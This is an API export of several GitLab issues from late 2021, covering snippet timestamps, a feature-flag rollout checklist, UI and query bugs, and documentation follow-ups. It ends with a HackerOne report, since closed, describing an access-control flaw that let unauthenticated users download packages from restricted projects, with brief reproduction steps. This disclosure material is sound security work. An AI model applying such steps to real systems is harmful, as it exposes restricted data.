[{"id":98844353,"iid":348185,"project_id":278964,"title":"Snippets `updated_at` time doesn't get updated on push","description":"### Summary\n\nPushing local changes to a snippet doesn't update its `updated_at` time that is shown in the UI or returned by the API. It only gets updated when changing the snippet through the web UI.\n\n### Steps to reproduce\n\n1. Create a new snippet with some example content\n1. Directly afterwards, modify the **file** of your snippet using the web UI  \n1. Note that it now says \"*Edited just now*\" below the snippet title\n1. Clone the snippet repository \u0026 modify the file locally\n1. Wait one or two minutes (just to make it more obvious), then push your local changes\n1. Refresh the snippet page and verify that your changes are present\n1. Note that it says \"*Edited X minutes ago*\" below the snippet title and not \"*Edited just now*\"\n\nNotes:\n- Same goes for the \"*updated ... ago*\" time shown on the list of snippets\n- On step 3 \u0026 7 you may also check the `updated_at` time returned by the API (`https://gitlab.com/api/v4/snippets/{SNIPPET_ID}`) and note that it will not change after step 3\n\n### What is the current *bug* behavior?\n\nPushing local changes to a snippet doesn't update its `updated_at` time that is shown in the UI or returned by the API.\n\n### What is the expected *correct* behavior?\n\nPushing local changes to a snippet **should** update its `updated_at` time, just like when changing the snippet via the web UI.\n\n### Output of checks\n\nThis bug happens on GitLab.com","state":"closed","created_at":"2021-12-10T16:21:28.033Z","updated_at":"2022-08-02T17:55:26.435Z","closed_at":"2022-08-02T17:55:26.417Z","closed_by":{"id":784278,"username":"eggerd","name":"Dustin Eckhardt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/784278/avatar.png","web_url":"https://gitlab.com/eggerd"},"labels":["Category:Snippets","[deprecated] Accepting merge requests","backend","devops::create","good for new contributors","group::editor","priority::3","section::dev","severity::3","type::bug","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":784278,"username":"eggerd","name":"Dustin Eckhardt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/784278/avatar.png","web_url":"https://gitlab.com/eggerd"},"type":"ISSUE","assignee":null,"user_notes_count":15,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348185","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348185","notes":"https://gitlab.com/api/v4/projects/278964/issues/348185/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348185/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348185","relative":"#348185","full":"gitlab-org/gitlab#348185"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98843881,"iid":348181,"project_id":278964,"title":"[Feature flag] Enable sbom survey","description":"## Summary\n\nThis issue is to rollout [the sbom survey banner](https://gitlab.com/gitlab-org/gitlab/-/issues/344949) on production,\nthat is currently behind the `sbom_survey` feature flag.\n\n## Owners\n\n- Team: secure:analyzer_frontend\n- Most appropriate slack channel to reach out to: `#s_secure-analyzer-frontend`\n- Best individual to reach out to: @jannik_lehmann \n- PM: @NicoleSchwartz \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nSbom survey banner will be displayed on the dependency scanning page, license compliance page and security dashboards (group and project, not instance).\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### What might happen if this goes wrong?\n\nThe banner won't be shown.\n\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set sbom_survey true --dev`\n    - [x] `/chatops run feature set sbom_survey true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set sbom_survey false\n```","state":"closed","created_at":"2021-12-10T16:10:13.879Z","updated_at":"2022-03-03T06:32:35.698Z","closed_at":"2022-01-21T19:08:17.557Z","closed_by":{"id":5412787,"username":"nmccorrison","name":"Neil McCorrison","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5412787/avatar.png","web_url":"https://gitlab.com/nmccorrison"},"labels":["feature flag","feature::addition","type::feature","workflow::in dev"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":7293390,"username":"jannik_lehmann","name":"Jannik Lehmann","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7293390/avatar.png","web_url":"https://gitlab.com/jannik_lehmann"}],"author":{"id":7293390,"username":"jannik_lehmann","name":"Jannik Lehmann","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7293390/avatar.png","web_url":"https://gitlab.com/jannik_lehmann"},"type":"ISSUE","assignee":{"id":7293390,"username":"jannik_lehmann","name":"Jannik Lehmann","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7293390/avatar.png","web_url":"https://gitlab.com/jannik_lehmann"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348181","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":9},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"9 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348181","notes":"https://gitlab.com/api/v4/projects/278964/issues/348181/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348181/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348181","relative":"#348181","full":"gitlab-org/gitlab#348181"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98819375,"iid":348159,"project_id":278964,"title":"Submit button is disabled for users different than 1","description":"After this MR (gitlab-org/gitlab!76112) the Submit button is not disabling unless the number of users is `1`. Due to the possibility that `just me` group add more users, this may cause disruption in cases of Plan purchase.\n\n||\n|-|\n|![Screenshot_2021-12-10_at_13.38.04](/uploads/f31439ea8e9a6ae623fe8069f7c6db63/Screenshot_2021-12-10_at_13.38.04.png)|","state":"closed","created_at":"2021-12-10T12:41:32.837Z","updated_at":"2021-12-11T08:01:57.665Z","closed_at":"2021-12-11T08:01:57.650Z","closed_by":{"id":6348276,"username":"agulina","name":"Angelo Gulina","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b28693a558066993ea93b7272208d285?s=80\u0026d=identicon","web_url":"https://gitlab.com/agulina"},"labels":["Category:Purchase","Unplanned","devops::fulfillment","frontend","group::purchase","section::fulfillment","type::bug","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":6348276,"username":"agulina","name":"Angelo Gulina","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b28693a558066993ea93b7272208d285?s=80\u0026d=identicon","web_url":"https://gitlab.com/agulina"}],"author":{"id":6348276,"username":"agulina","name":"Angelo Gulina","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b28693a558066993ea93b7272208d285?s=80\u0026d=identicon","web_url":"https://gitlab.com/agulina"},"type":"ISSUE","assignee":{"id":6348276,"username":"agulina","name":"Angelo Gulina","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b28693a558066993ea93b7272208d285?s=80\u0026d=identicon","web_url":"https://gitlab.com/agulina"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348159","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348159","notes":"https://gitlab.com/api/v4/projects/278964/issues/348159/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348159/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348159","relative":"#348159","full":"gitlab-org/gitlab#348159"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98818669,"iid":348158,"project_id":278964,"title":"Update CI integration docs for new SSL verification setting","description":"## Summary\n\nThis is a follow-up to https://gitlab.com/gitlab-org/security/gitlab/-/merge_requests/2043, where we added a new \"Enable SSL verification\" setting on some CI integrations.\n\nThis should also be documented on:\n\n- https://gitlab.com/gitlab-org/gitlab/blob/master/doc/user/project/integrations/bamboo.md\n- https://gitlab.com/gitlab-org/gitlab/blob/master/doc/integration/jenkins.md\n\n## Links\n\nSimilar docs for webhooks: https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/user/project/integrations/webhooks.md#verify-an-ssl-certificate","state":"closed","created_at":"2021-12-10T12:32:54.493Z","updated_at":"2022-11-22T19:10:10.257Z","closed_at":"2022-02-16T09:33:12.343Z","closed_by":{"id":423116,"username":"toupeira","name":"Markus Koller","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7585ed50675c4febe7619f25b44f7fe0?s=80\u0026d=identicon","web_url":"https://gitlab.com/toupeira"},"labels":["Category:Integrations","devops::manage","documentation","group::integrations","quad-planning::complete-no-action","section::dev","type::maintenance","workflow::in review"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":423116,"username":"toupeira","name":"Markus Koller","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7585ed50675c4febe7619f25b44f7fe0?s=80\u0026d=identicon","web_url":"https://gitlab.com/toupeira"}],"author":{"id":423116,"username":"toupeira","name":"Markus Koller","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7585ed50675c4febe7619f25b44f7fe0?s=80\u0026d=identicon","web_url":"https://gitlab.com/toupeira"},"type":"ISSUE","assignee":{"id":423116,"username":"toupeira","name":"Markus Koller","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7585ed50675c4febe7619f25b44f7fe0?s=80\u0026d=identicon","web_url":"https://gitlab.com/toupeira"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348158","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348158","notes":"https://gitlab.com/api/v4/projects/278964/issues/348158/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348158/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348158","relative":"#348158","full":"gitlab-org/gitlab#348158"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98809315,"iid":348149,"project_id":278964,"title":"Diffs don't load on MR view","description":"## Problem\n\nSeveral MRs needed for the 14.6 release post fail to render the diff view\n\nMRs affected:\n\n* **Bug Fixes:** https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/94878\n* **Usability improvements:** https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/94879\n* **Performance improvements:** https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/94880\n\nThis is critical for the %\"14.6\" release post and the MRs will likely be opened/changed several times starting today until the 17th.\n\n## Context\n\nCopied from https://gitlab.slack.com/archives/CETG54GQ0/p1639126927009400 :\n\n\u003e https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/94878/diffs_batch.json?diff_head=true\u0026view=inline\u0026w=0\u0026page=0\u0026per_page=5 is timing out due to SQL\n\nhttps://sentry.gitlab.net/gitlab/gitlabcom/issues/3091094/\n\n```\n/*application:web,correlation_id:01FPHTSG3BH1T1MCMYETTDJNCT,endpoint_id:Projects::MergeRequests::DiffsController#diffs_batch,db_config_name:main_replica*/ SELECT \"environments\".* FROM \"environments\" WHERE \"environments\".\"project_id\" = $1 AND (\"environments\".\"state\" IN ($2)) AND (EXISTS (SELECT \"deployments\".* FROM \"deployments\" WHERE (ref = $3 OR tag IS TRUE) AND (environment_id = environments.id))) ORDER BY (SELECT MAX(\"deployments\".\"id\") FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = \"environments\".\"id\") DESC NULLS LAST\n```","state":"closed","created_at":"2021-12-10T10:07:59.232Z","updated_at":"2022-01-18T11:40:32.602Z","closed_at":"2022-01-18T11:39:55.941Z","closed_by":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"labels":["Release::P1","UX","devops::release","group::release","priority::2","section::ops","severity::2","type::bug","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"}],"author":{"id":4545061,"username":"nagyv-gitlab","name":"Viktor Nagy (GitLab)","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fb255c1e9c228b9356af165939b3ac9b?s=80\u0026d=identicon","web_url":"https://gitlab.com/nagyv-gitlab"},"type":"ISSUE","assignee":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"user_notes_count":20,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348149","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348149","notes":"https://gitlab.com/api/v4/projects/278964/issues/348149/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348149/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348149","relative":"#348149","full":"gitlab-org/gitlab#348149"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98805910,"iid":348145,"project_id":278964,"title":"Add language field to the Blob GraphQL query","description":"### Description\n\nIn https://gitlab.com/gitlab-org/gitlab/-/merge_requests/76525/diffs we added support for highlight.js.\n\nAs part of [highlighting source code using HighlightJS](https://gitlab.com/groups/gitlab-org/-/epics/7146) we need a way to tell highlight.js what language definition to use for highlighting the content. \n\nThis issue is about adding a language field to the Blob Info GraphQL query (`project \u003e repository \u003e blobs \u003e nodes`).\n\n### Benefits\n\nWe currently have auto-detection enabled which loads only a subset of common languages. Auto-detection also has a larger footprint since we're not loading one specific language.\n\nIf we can determine the language of a blob upfront we can ensure that we only import and register a specific language thus reducing the overall footprint.","state":"closed","created_at":"2021-12-10T09:25:23.562Z","updated_at":"2022-02-18T07:01:03.565Z","closed_at":"2022-02-09T08:39:11.589Z","closed_by":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"labels":["Category:Source Code Management","Deliverable","auto updated","backend","backend-weight::2","devops::create","frontend","frontend-weight::1","group::source code","section::dev","workflow::in review"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"}],"author":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"type":"ISSUE","assignee":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348145","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348145","notes":"https://gitlab.com/api/v4/projects/278964/issues/348145/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348145/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348145","relative":"#348145","full":"gitlab-org/gitlab#348145"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7146,"epic":{"id":387817,"iid":7146,"title":"Highlight source code syntax on the frontend using HighlightJS","url":"/groups/gitlab-org/-/epics/7146","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98800747,"iid":348138,"project_id":278964,"title":"Unauthenticated users can see and download packages from public projects whose repositories are restricted","description":"**[HackerOne report #1419637](https://hackerone.com/reports/1419637)** by `ashish_r_padelkar` on 2021-12-08, assigned to @rshambhuni:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary\n\nHello,\n\nI reported similar issue before #635502 and it was resolved.\n\nNot sure if there are any changes afterwards but this issue is appearing again for me. The list of packages are visible (and also downloadable now) to any unauthenticated users even when public project has repositories restricted only to team members. \n\n#####  Steps to reproduce\n\n1. Create a public group and public project underneath.  \n2. Go to project settings and set `Repositories` to be limited only to team members.\n\n![Screen_Shot_2021-12-08_at_2.01.10_PM.png](https://h1.sec.gitlab.net/a/c86c4464-78fa-4065-ae42-f20085d07a33/Screen_Shot_2021-12-08_at_2.01.10_PM.png)\n\n3. Since `Packages` are part of repositories, they shouldn't be visible to users without access to group or project.  \n4. Now browse the url unauthenticated `https://gitlab.com/\u003cGroupName\u003e/\u003cProjectName\u003e/-/packages` and you will see the packages as well as you can download the files (which was not possible during #635502).  \n5. The permissions are correctly enforced at group level though. You CAN NOT see packages at group level `https://gitlab.com/groups/\u003cGroupName\u003e/-/packages`.\n\n\n\n#####  Examples\n\nYou can browse my url unauthenticated `https://gitlab.com/g3220/githubimport/-/packages` and you will see list of packages and download the files inside it. \n\nRepositories for that projects are restricted only to team members.\n\nPermissions correctly enforced at group level `https://gitlab.com/groups/g3220/-/packages`\n\n#####  What is the current *bug* behavior?\n\nUnauthenticated user can see and download packages of public projects whose repositories are restricted .\n\n#####  What is the expected *correct* behavior?\n\nWhen repositories are restricted, users without access to project shouldn't see packages l.\n\n\n\n#####  Output of checks\n\nThis bug happens on GitLab.com\n\nRegards,  \nAshish\n\n####  Impact\n\nUnauthenticated users can see and download packages from public projects whose repositories are restricted\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [Screen_Shot_2021-12-08_at_2.01.10_PM.png](https://h1.sec.gitlab.net/a/c86c4464-78fa-4065-ae42-f20085d07a33/Screen_Shot_2021-12-08_at_2.01.10_PM.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2021-12-10T07:41:25.443Z","updated_at":"2022-05-10T09:07:30.252Z","closed_at":"2022-03-24T18:17:57.884Z","closed_by":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"labels":["Category:Package Registry","Deliverable","HackerOne","Package:P1","Weakness::CWE-284","backend","bug::vulnerability","devops::package","group::package registry","priority::3","ruby","section::ops","security","severity::3","type::bug","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab 